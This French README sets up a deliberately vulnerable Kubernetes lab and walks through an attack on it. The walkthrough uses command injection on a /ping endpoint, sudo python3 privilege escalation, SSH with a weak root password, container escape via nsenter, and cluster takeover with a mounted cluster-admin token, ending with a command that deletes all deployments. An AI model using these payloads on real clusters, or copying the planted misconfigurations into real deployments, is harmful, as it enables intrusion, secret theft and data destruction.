# Scénario de Cluster Kubernetes Vulnérable

Ce projet met en place un environnement de cluster Kubernetes conçu pour démontrer un chemin d'attaque en plusieurs étapes, illustrant des vulnérabilités et des mauvaises configurations courantes.

**Objectif du Scénario :** Déployer un cluster avec des vulnérabilités intentionnelles, permettant à un attaquant de passer d'un service web exposé à une compromission complète du cluster.

**Architecture :**

*   **Namespace `external`**: Contient les ressources exposées publiquement.
    *   **Pod 1 (`pod1-webapp`)**:
        *   Exécute une application web Flask (image `vulnerable-webapp:latest`) accessible via un Service NodePort (`pod1-webapp-service`).
        *   **(Intention initiale)** Vulnérable à l'**Injection de Commandes** via un endpoint `/ping`. S'exécute en tant que `appuser` avec `sudo NOPASSWD` pour `/usr/bin/python3`, permettant l'**Escalade de Privilèges**. *(Note: La vulnérabilité effective dépend du code actuel dans `pod1-webapp-src/app.py`)*.
        *   Utilise un ConfigMap (`pod1-config`) et un Secret (`pod1-secrets`).
        *   Network Policy sortante autorisée *uniquement* vers `pod2-ssh` dans le namespace `internal` (port 22).
*   **Namespace `internal`**: Contient les ressources internes.
    *   **Pod 2 (`pod2-ssh`)**:
        *   Exécute un serveur SSH (image `ssh-server:latest`), accessible *uniquement* depuis `pod1-webapp` (via Service ClusterIP `pod2-ssh-service` et Network Policy entrante).
        *   Accès root possible via SSH (clé publique montée depuis le Secret `pod2-ssh-key`, ou mot de passe faible `root:password123` défini dans le Dockerfile).
        *   S'exécute en tant que **conteneur privilégié** (`securityContext.privileged: true`) et avec `hostPID: true`, conçu pour l'**Évasion de Pod / Sortie de Conteneur**.
        *   Utilise un `ServiceAccount` (`cluster-admin-sa`) lié à un `ClusterRole` (`cluster-admin-role`) avec des permissions `* * *` (Cluster Admin), conçu pour la **Prise de Contrôle du Cluster**.
*   **Network Policies** : Forcent le flux de communication prévu : Externe -> Pod 1 (external) -> Pod 2 (internal).

## Prérequis

*   Docker installé et en cours d'exécution.
*   `kubectl` installé.
*   Un cluster Kubernetes en cours d'exécution (par exemple, Docker Desktop Kubernetes, Minikube, OrbStack, k3d, etc.). Assurez-vous que `kubectl` est configuré pour pointer vers votre cluster cible.

## Instructions d'Installation

0.  **Démarrer Minikube (si utilisé) :**
    ```bash
    minikube start --driver=docker
    ```
    *(Note: Contrairement à `eval $(minikube docker-env)`, nous utiliserons `minikube image load` après la construction des images pour s'assurer qu'elles sont disponibles dans le cluster Minikube.)*
    *(Si vous utilisez un autre environnement Kubernetes comme Docker Desktop ou OrbStack, le chargement d'image n'est généralement pas nécessaire car ils partagent l'environnement Docker de l'hôte.)*

1.  **Cloner le Dépôt (si applicable) :**
    ```bash
    # git clone <url-du-depot>
    # cd <repertoire-du-depot>
    ```

2.  **Construire les Images Docker :**
    Construisez localement les images pour les deux pods.
    ```bash
    docker build -t vulnerable-webapp:latest pod1-webapp-src/
    docker build -t ssh-server:latest pod2-ssh-server-src/
    ```
    **Si vous utilisez Minikube**, chargez les images dans l'environnement du cluster :
    ```bash
    minikube image load vulnerable-webapp:latest
    minikube image load ssh-server:latest
    ```
    *(Note : Si votre cluster Kubernetes n'utilise pas automatiquement les images de votre démon Docker local (par exemple, un cluster distant ou K3d sans import), vous devrez pousser ces images vers un registre accessible et mettre à jour les noms d'images dans les fichiers `k8s/*.yaml`.)*

3.  **Déployer sur Kubernetes :**
    Appliquez tous les fichiers manifestes Kubernetes situés dans le répertoire `k8s`.
    ```bash
    kubectl apply -f k8s/
    ```

4.  **Vérifier le Déploiement :**
    Vérifiez que les pods s'exécutent et que les services sont créés dans leurs namespaces respectifs.
    ```bash
    kubectl get pods -n external
    kubectl get pods -n internal
    kubectl get services -n external
    kubectl get services -n internal
    ```
    Vous devriez voir `pod1-webapp-<hash>` (dans `external`) et `pod2-ssh-<hash>` (dans `internal`) à l'état `Running`. Notez le NodePort assigné à `pod1-webapp-service` (namespace `external`).

## Chemin d'Exploitation

1.  **Accéder à l'Application Web (Pod 1) :**
    Ouvrez votre navigateur et naviguez vers `http://<IP_DU_NODE>:<NODE_PORT>` ou `http://localhost:<NODE_PORT>` si vous utilisez Docker Desktop/OrbStack. (Remplacez `<NODE_PORT>` par le port noté à l'étape 4 de l'Installation).

2.  **Injection de Commandes (Pod 1) :**
    *(Note: Cette étape dépend de la présence de la vulnérabilité d'injection de commandes dans le code actuel de `pod1-webapp-src/app.py` via le endpoint `/ping`).*
    Utilisez le champ "Host to ping" ou manipulez l'URL pour injecter des commandes.
    *   Exemple : `http://localhost:<NODE_PORT>/ping?host=127.0.0.1; id`
    *   Objectif : Obtenir l'exécution de commandes en tant que `appuser`. Essayez `ls /`, `whoami`, `cat /etc/passwd`.

3.  **Escalade de Privilèges (Pod 1) :**
    *(Note: Cette étape dépend de la configuration `sudo NOPASSWD` et de la vulnérabilité précédente).*
    Abusez de la configuration `sudo NOPASSWD` pour python3. Injectez une commande qui utilise `sudo python3` pour exécuter du code en tant que root dans le conteneur.
    *   Exemple de Payload pour l'URL : `127.0.0.1; sudo python3 -c 'import os; os.system("id")'`
    *   Obtenir un shell root : `127.0.0.1; sudo python3 -c 'import os; os.system("/bin/bash")'` (Note : Ce shell interactif peut être délicat via les requêtes web, souvent on établirait un reverse shell ici).

4.  **Découverte Réseau (Trouver Pod 2) :**
    Depuis votre shell root / exécution de commandes sur le Pod 1 (`external`), trouvez l'adresse IP interne du Pod 2 (`internal`).
    *   Le nom du service interne est `pod2-ssh-service` dans le namespace `internal`. Le DNS du cluster devrait le résoudre en `pod2-ssh-service.internal.svc.cluster.local` ou simplement `pod2-ssh-service` (si la recherche de namespace est configurée).
    *   Essayez de le pinger : `ping pod2-ssh-service.internal` (ou `ping pod2-ssh-service`)
    *   Ou utilisez des outils d'analyse réseau (si installés ou installables) : `apt-get update && apt-get install -y iproute2 net-tools nmap; ip a; nmap <PLAGE_IP_CLUSTER>` (Trouvez la plage via `ip a`).
    *   Alternativement, vérifiez les variables d'environnement ou les mécanismes de découverte de service si disponibles. L'IP du service a été listée par `kubectl get svc` également (`pod2-ssh-service` `CLUSTER-IP`). Supposons que c'est `192.168.194.218` basé sur la sortie précédente.

5.  **Mouvement Latéral (SSH vers Pod 2) :**
    Connectez-vous en SSH au Pod 2 en utilisant soit la clé SSH (si montée et connue) soit les identifiants root faibles (`root` / `password123`). Vous devrez peut-être d'abord installer un client SSH sur le Pod 1 (`apt-get update && apt-get install -y openssh-client`).
    ```bash
    # Depuis le shell root sur Pod 1
    ssh root@pod2-ssh-service.internal # Utiliser le nom DNS du service
    # Entrez le mot de passe : password123 (ou utilisez la clé SSH)
    ```
    Vous devriez maintenant avoir un shell root sur le Pod 2.

6.  **Évasion de Pod / Sortie de Conteneur (Depuis Pod 2) :**
    Le Pod 2 s'exécute en tant que privilégié (`privileged: true`) et avec `hostPID: true`. Cela permet d'accéder aux ressources de l'hôte. Il existe de nombreuses techniques, voici quelques concepts :
    *   **Accéder aux Processus Hôtes :** Puisque `hostPID` est vrai, `ps aux` à l'intérieur du conteneur montre les processus de l'*hôte*. Vous pourriez trouver des informations sensibles ou des processus avec lesquels interagir.
    *   **Accéder au Système de Fichiers Hôte :** Les conteneurs privilégiés peuvent souvent monter les périphériques hôtes (`fdisk -l` pourrait montrer les disques hôtes) ou trouver des moyens d'accéder au système de fichiers hôte, potentiellement via `/proc/<pid_hote>/root/`.
    *   **Créer un Pod Hôte Privilégié :** Utilisez le token de compte de service monté (voir étape suivante) pour créer un nouveau pod directement sur le réseau/namespace de l'hôte avec des montages hôtes.
    *   **Exécuter une Commande sur l'Hôte :** Trouvez le PID 1 de l'hôte (processus init) via `ps aux`, puis utilisez `nsenter` pour entrer dans les namespaces de l'hôte et exécuter des commandes : `nsenter --target <PID_1_HOTE> --mount --uts --ipc --net --pid <commande>`.

7.  **Prise de Contrôle du Cluster (Depuis Pod 2) :**
    Le token du ServiceAccount `cluster-admin-sa` (namespace `internal`) est monté dans le Pod 2 (généralement à `/var/run/secrets/kubernetes.io/serviceaccount/token`). Ce compte est lié au `ClusterRole` `cluster-admin-role` avec les permissions `* * *`.
    *   Installez `kubectl` à l'intérieur du Pod 2 (`apt-get update && apt-get install -y kubectl`).
    *   Utilisez le token monté pour interagir avec l'API Kubernetes en tant que cluster-admin :
        ```bash
        # Dans le shell du Pod 2
        TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
        CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        APISERVER=https://kubernetes.default.svc # Adresse interne par défaut du serveur API

        # Tester l'accès
        kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get nodes
        kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT get secrets --all-namespaces 
        # Vous avez maintenant le contrôle total du cluster !
        ```
    *   Simuler l'arrêt : `kubectl --server=$APISERVER --token=$TOKEN --certificate-authority=$CACERT delete deployment --all --all-namespaces` (Ne pas exécuter sauf si intentionnel !)

## Nettoyage

Pour supprimer toutes les ressources créées par ce scénario (y compris les namespaces) :
```bash
kubectl delete -f k8s/
```
*(Note: `kubectl delete -f k8s/` supprimera les namespaces `external` et `internal` et toutes les ressources qu'ils contiennent, ainsi que les ressources ClusterRole/Binding si elles sont dans les fichiers.)*

Vous pouvez également vouloir supprimer les images Docker et arrêter Minikube :
```bash
# Si Minikube a été utilisé pour charger les images
minikube image rm vulnerable-webapp:latest
minikube image rm ssh-server:latest

# Sinon, depuis votre Docker local
docker rmi vulnerable-webapp:latest ssh-server:latest

# Arrêter Minikube (si démarré)
minikube stop
minikube delete # Optionnel, pour supprimer complètement le cluster